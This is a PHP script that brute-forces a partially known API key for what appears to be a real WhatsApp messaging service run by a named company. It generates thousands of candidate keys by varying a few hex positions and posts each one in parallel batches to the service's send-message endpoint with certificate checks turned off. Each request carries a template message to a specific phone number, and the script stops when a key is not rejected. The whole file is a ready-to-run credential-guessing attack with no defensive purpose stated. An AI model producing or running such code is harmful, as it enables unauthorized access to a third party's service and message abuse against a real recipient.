<?php
/**
 * Expanded Parallel fuzzing script for Epsilon WhatsApp API Key
 */

$pos0_5 = "7d3a86";
$pos6 = "d";
$pos7 = "8";
$pos8 = "8";

// Choices for position 9
$pos9_choices = ["c", "0", "a", "8", "d", "9", "e", "f", "1", "7", "4", "b"];

$pos10 = "9";
$pos11_19 = "feede7651";

// Choices for position 20 (including 'e', '8', '9' and other hex chars)
$pos20_choices = ["f", "e", "c", "0", "4", "1", "7", "8", "9", "a", "d", "b"];

$pos21_25 = "07b62";

// Choices for position 26
$pos26_choices = ["0", "d", "8", "a", "c", "e", "f", "9", "b"];

$pos27_28 = "cb";

// Choices for position 29
$pos29_choices = ["1", "f", "7", "4", "d", "a", "0", "b", "e", "c"];

$pos30_31 = "a1";

$candidates = [];

foreach ($pos9_choices as $p9) {
    foreach ($pos20_choices as $p20) {
        foreach ($pos26_choices as $p26) {
            foreach ($pos29_choices as $p29) {
                $key = $pos0_5 . $pos6 . $pos7 . $pos8 . $p9 . $pos10 . $pos11_19 . $p20 . $pos21_25 . $p26 . $pos27_28 . $p29 . $pos30_31;
                if (strlen($key) === 32) {
                    $candidates[] = "epsilon_" . $key;
                }
            }
        }
    }
}

$candidates = array_unique($candidates);
echo "Generated " . count($candidates) . " unique candidate API keys.\n";

$api_url = "https://whatsapp.epsilon-technology.com/api/external/send-message";

// Payload
$payload = [
    "messaging_product" => "whatsapp",
    "to" => "919638249696",
    "type" => "template",
    "template" => [
        "name" => "contact_form",
        "language" => ["code" => "en_US"],
        "components" => [
            [
                "type" => "body",
                "parameters" => [
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"]
                ]
            ]
        ]
    ]
];
$json_payload = json_encode($payload);

// Batch size
$batch_size = 50;
$chunks = array_chunk($candidates, $batch_size);

foreach ($chunks as $chunk_idx => $chunk) {
    if ($chunk_idx % 20 === 0) {
        echo "Processing batch " . ($chunk_idx + 1) . "/" . count($chunks) . " (" . count($chunk) . " keys)...\n";
    }
    
    $mh = curl_multi_init();
    $handles = [];
    
    foreach ($chunk as $key) {
        $ch = curl_init($api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_payload);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            "Content-Type: application/json",
            "x-api-key: " . $key
        ]);
        curl_multi_add_handle($mh, $ch);
        $handles[$key] = $ch;
    }
    
    // Execute handles
    $active = null;
    do {
        $mrc = curl_multi_exec($mh, $active);
    } while ($mrc == CURLM_CALL_MULTI_PERFORM);
    
    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) != -1) {
            do {
                $mrc = curl_multi_exec($mh, $active);
            } while ($mrc == CURLM_CALL_MULTI_PERFORM);
        }
    }
    
    // Check responses
    foreach ($handles as $key => $ch) {
        $response = curl_multi_getcontent($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
        
        // Ignore code 0 (timeouts / connection errors)
        if ($http_code !== 0) {
            if ($http_code !== 403 || strpos($response, "Invalid API Key") === false) {
                echo "\nSUCCESS!!! Found key: $key\n";
                echo "HTTP Code: $http_code\n";
                echo "Response: $response\n";
                exit;
            }
        }
    }
    
    curl_multi_close($mh);
    usleep(50000); // 50ms
}

echo "Done. No valid key found.\n";
